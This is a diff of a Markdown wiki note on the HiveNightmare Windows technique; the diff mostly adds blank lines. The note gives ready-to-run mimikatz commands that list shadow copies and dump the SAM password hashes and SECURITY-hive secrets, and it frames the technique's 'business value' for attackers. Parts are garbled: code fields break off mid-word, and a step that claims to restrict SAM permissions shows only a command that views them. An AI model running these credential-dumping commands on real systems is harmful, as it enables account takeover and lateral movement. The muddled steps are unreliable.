@@ -43,6 +43,8 @@ Technical Explanation: HiveNightmare takes advantage of a vulnerability in the W
 
 Business Value: HiveNightmare is a powerful tool for attackers looking to escalate their privileges and gain access to sensitive information. By extracting password hashes, attackers can gain access to other systems and resources, potentially leading to data theft, financial loss, and reputational damage.
 
+ 
+
 ## Requirements
 
 1. Access to the Windows registry
@@ -50,6 +52,8 @@ Business Value: HiveNightmare is a powerful tool for attackers looking to escala
 1. Authentication on the target system
 
 1. Access to the Volume Shadow Copy Service
+
+ 
 
 ## Defense
 
@@ -59,6 +63,8 @@ Business Value: HiveNightmare is a powerful tool for attackers looking to escala
 
 1. Monitor for suspicious activity related to the Volume Shadow Copy Service
 
+ 
+
 ## Objectives
 
 1. Gain access to the SAM database
@@ -67,13 +73,23 @@ Business Value: HiveNightmare is a powerful tool for attackers looking to escala
 
 1. Use password hashes to escalate privileges
 
+ 
+
 # Instructions
 
 1. Run the following command in Command Prompt: icacls <file/folder path>
 
+ 
+
+
+
 **Code**: [[icacls]]
 
+
+
 > This command is used to check the permissions of a file or folder. It can be used to identify potential vulnerabilities in the system by checking if unauthorized users have access to sensitive files or folders. The output of the command will display the current permissions for the specified file or folder, including the users and groups that have access.
+
+
 
 **Command** ([[Viewing Permissions for a File or Folder using icacls]]):
 
@@ -81,20 +97,36 @@ Business Value: HiveNightmare is a powerful tool for attackers looking to escala
 icacls C:\Windows\System32\notepad.exe
 ```
 
+
+
 2. Use the icacls command to modify the access control list (ACL) of the SAM configuration file. The ACL should only grant full control to the built-in administrators group and the system account. Remove the read and execute permissions for regular users.
+
+ 
+
+
 
 **Code**: [[C:\Windows\System32> icacls config\SAM
 config\SAM ]]
+
+
 
 > The icacls command is used to view and modify ACLs for files and folders. In this case, we are modifying the ACL for the SAM configuration file. The 'BUILTIN\Users:(I)(RX)' entry grants read and execute permissions to all regular users, which is not necessary and can be a security risk. By removing this entry, we ensure that only administrators and the system account have full control over the file, while regular users have no access.
 
 3. Use the `mimikatz` tool to extract credentials from shadow copies of the Windows file system.
 
+ 
+
+
+
 **Code**: [[mimikatz> token::whoami /full
 
 # List shadow copie]]
 
+
+
 > This command is useful for extracting credentials from a compromised Windows system, particularly if the attacker has limited privileges and cannot access the live system. By accessing shadow copies of the file system, the attacker can extract sensitive information such as user account credentials and other secrets.
+
+
 
 **Command** ([[Token whoami]]):
 
@@ -102,11 +134,19 @@ config\SAM ]]
 mimikatz> token::whoami /full
 ```
 
+
+
+
+
 **Command** ([[List shadow copies]]):
 
 ```bash
 mimikatz> misc::shadowcopies
 ```
+
+
+
+
 
 **Command** ([[Extract account from SAM databases]]):
 
@@ -114,11 +154,17 @@ mimikatz> misc::shadowcopies
 mimikatz> lsadump::sam /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM /sam:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM
 ```
 
+
+
+
+
 **Command** ([[Extract secrets from SECURITY]]):
 
 ```bash
 mimikatz> lsadump::secrets /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM /security:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY
 ```
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -148,3 +194,5 @@ mimikatz> lsadump::secrets /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCop
 - [[EoP - Looting for passwords]]
 - [[HiveNightmare]]
 - [[Windows - Privilege Escalation]]
+
+
